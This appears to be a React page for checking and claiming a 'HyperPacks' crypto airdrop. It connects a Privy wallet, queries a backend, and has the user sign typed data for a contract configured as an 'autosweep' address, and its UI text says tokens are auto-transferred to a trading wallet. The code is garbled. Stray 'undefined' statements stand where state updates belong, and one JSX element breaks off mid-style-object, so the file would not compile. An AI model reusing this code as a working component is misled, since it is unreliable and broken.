import React, { useState, useEffect } from 'react';
import { usePrivy, useWallets } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import Footer from '../components/Footer';

const API_BASE = window.location.origin;

const EligibilityChecker = () => {
  const { ready, authenticated, login } = usePrivy();
  const { wallets } = useWallets();
  
  const [loading, setLoading] = useState(false);
  const [eligibility, setEligibility] = useState(null);
  const [claiming, setClaiming] = useState(false);
  const [claimed, setClaimed] = useState(false);
  const [error, setError] = useState(null);

  const walletAddress = wallets?.[0]?.address;

  useEffect(() => {
    if (authenticated && walletAddress) {
      checkEligibility();
    }
  }, [authenticated, walletAddress]);

  const checkEligibility = async () => {
    if (!walletAddress) return;

    try {
      setLoading(true);
      setError(null);
      const response = await fetch(`${API_BASE}/api/hyperpacks/eligibility/${walletAddress}`);
      const data = await response.json();
      setEligibility(data);
    } catch (err) {
      console.error(err);
      setError('Failed to check eligibility');
    } finally {
      setLoading(false);
    }
  };

  const claimAirdrop = async () => {
    if (!authenticated || !walletAddress || !eligibility?.eligible) return;

    try {
      setClaiming(true);
      setError(null);

      const embeddedWallet = wallets.find(w => w.walletClientType === 'privy');
      if (!embeddedWallet) {
        throw new Error('Privy wallet not found');
      }

      await embeddedWallet.switchChain(999);

      const provider = await embeddedWallet.getEthersProvider();
      const signer = provider.getSigner();

      const domain = {
        name: 'HyperPacks Whitelist',
        version: '1',
        chainId: 999,
        verifyingContract: process.env.REACT_APP_AUTOSWEEP_CONTRACT || '0x0000000000000000000000000000000000000000'
      };

      const types = {
        ClaimWhitelist: [
          { name: 'wallet', type: 'address' },
          { name: 'allocation', type: 'uint256' },
          { name: 'nonce', type: 'uint256' }
        ]
      };

      const value = {
        wallet: walletAddress,
        allocation: eligibility.allocation,
        nonce: Date.now()
      };

      const signature = await signer._signTypedData(domain, types, value);

      const response = await fetch(`${API_BASE}/api/hyperpacks/claim-whitelist`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ wallet: walletAddress, signature })
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || 'Claim failed');
      }

      undefined
      setTimeout(() => checkEligibility(), 2000);
    } catch (err) {
      console.error(err);
      setError(err.message || 'Failed to claim whitelist');
    } finally {
      setClaiming(false);
    }
  };

  return (
    <div className="app">
      <nav className="nav">
        <div className="nav-container">
          <div className="nav-logo">
            <a href="/" className="logo-text brand-gradient-text">HyperPack</a>
          </div>
          <div className="nav-links">
            {!authenticated ? (
              <button onClick={login} className="btn-primary">
                Connect Wallet
              </button>
            ) : (
              <div style={{ 
                padding: '8px 16px', 
                background: 'rgba(0, 204, 221, 0.1)', 
                borderRadius: '8px',
                fontSize: '14px',
                fontFamily: 'JetBrains Mono, monospace'
              }}>
                {walletAddress?.slice(0, 6)}...{walletAddress?.slice(-4)}
              </div>
            )}
          </div>
        </div>
      </nav>

      <section className="hero" style={{ minHeight: '80vh', paddingBottom: '60px' }}>
        <div className="hero-container">
          <div className="hero-content" style={{ maxWidth: '600px', margin: '0 auto' }}>
            <h1 className="hero-title" style={{ marginBottom: '16px' }}>
              <span className="brand-gradient-text">Eligibility Checker</span>
            </h1>
            <p className="hero-subtitle" style={{ marginBottom: '40px' }}>
              Check if you qualify for rewards
            </p>

            {!authenticated ? (
              <div style={{ 
                background: 'var(--bg-card)', 
                padding: '40px', 
                borderRadius: '16px',
                border: '1px solid var(--border-primary)',
                textAlign: 'center'
              }}>
                <h3 style={{ marginBottom: '12px', fontSize: '20px' }}>Connect Your Wallet</h3>
                <p style={{ color: 'var(--text-secondary)', marginBottom: '24px' }}>
                  Please connect your wallet to check airdrop eligibility
                </p>
                <button onClick={login} className="btn-primary">
                  Connect Wallet
                </button>
              </div>
            ) : (
              <>
                {loading && (
                  <div style={{ 
                    background: 'var(--bg-card)', 
                    padding: '60px', 
                    borderRadius: '16px',
                    border: '1px solid var(--border-primary)',
                    textAlign: 'center'
                  }}>
                    <div style={{
                      border: '4px solid var(--border-primary)',
                      borderTop: '4px solid var(--accent-primary)',
                      borderRadius: '50%',
                      width: '50px',
                      height: '50px',
                      animation: 'spin 1s linear infinite',
                      margin: '0 auto 20px'
                    }}></div>
                    <p>Checking eligibility...</p>
                  </div>
                )}

                {error && (
                  <div style={{ 
                    background: 'rgba(255, 68, 68, 0.1)', 
                    padding: '20px', 
                    borderRadius: '12px',
                    border: '1px solid var(--danger)',
                    textAlign: 'center',
                    color: 'var(--danger)'
                  }}>
                    <p>{error}</p>
                  </div>
                )}

                {claimed && (
                  <div style={{ 
                    background: 'rgba(0, 255, 136, 0.1)', 
                    padding: '30px', 
                    borderRadius: '16px',
                    border: '1px solid var(--success)',
                    textAlign: 'center',
                    marginBottom: '20px'
                  }}>
                    <h3 style={{ color: 'var(--success)', marginBottom: '12px' }}>✅ Airdrop Claimed!</h3>
                    <p style={{ color: 'var(--text-secondary)' }}>
                      Your tokens will be auto-swept to your trading wallet
                    </p>
                  </div>
                )}

                {eligibility && !loading && (
                  <div style={{ 
                    background: eligibility.eligible ? 'rgba(0, 255, 136, 0.05)' : 'rgba(255, 68, 68, 0.05)', 
                    padding: '40px', 
                    borderRadius: '16px',
                    border: `1px solid ${eligibility.eligible ? 'var(--success)' : 'var(--danger)'}`,
                    textAlign: 'center'
                  }}>
                    <div style={{ fontSize: '48px', marginBottom: '16px' }}>
                      {eligibility.eligible ? '✅' : '❌'}
                    </div>
                    <h2 style={{ marginBottom: '20px', fontSize: '28px' }}>
                      {eligibility.eligible
                        ? eligibility.claimed
                          ? 'Already Claimed!'
                          : "You're Eligible!"
                        : 'Not Eligible'}
                    </h2>
                    {eligibility.eligible && (
                      <>
                        <div style={{ 
                          fontSize: '12px', 
                          color: 'var(--text-muted)', 
                          marginBottom: '8px',
                          textTransform: 'uppercase',
                          letterSpacing: '1px'
                        }}>
                          Your Allocation
                        </div>
                        <div className="brand-gradient-text" style={{ 
                          fontSize: '42px', 
                          undefined
                        {!eligibility.claimed && eligibility.allocation && (
                          <button
                            className="btn-primary"
                            onClick={claimAirdrop}
                            disabled={claiming}
                            style={{ marginTop: '24px', padding: '16px 48px', fontSize: '16px' }}
                          >
                            {claiming ? 'Claiming...' : 'Claim your Whitelist'}
                          </button>
                        )}
                      </>
                    )}
                  </div>
                )}

                {eligibility?.eligible && (
                  <div style={{ 
                    background: 'var(--bg-card)', 
                    padding: '30px', 
                    borderRadius: '16px',
                    border: '1px solid var(--border-primary)',
                    marginTop: '24px',
                    textAlign: 'left'
                  }}>
                    <h3 style={{ marginBottom: '16px' }}>How It Works:</h3>
                    <ul style={{ listStyle: 'none', padding: 0 }}>
                      <li style={{ padding: '8px 0', color: 'var(--text-secondary)' }}>✓ Sign to claim (no gas fees)</li>
                      <li style={{ padding: '8px 0', color: 'var(--text-secondary)' }}>✓ Tokens sent to your wallet</li>
                      <li style={{ padding: '8px 0', color: 'var(--text-secondary)' }}>✓ Auto-transferred to trading wallet</li>
                      <li style={{ padding: '8px 0', color: 'var(--text-secondary)' }}>✓ Protected and ready for use</li>
                    </ul>
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      </section>

      <Footer />
    </div>
  );
};

export default EligibilityChecker;
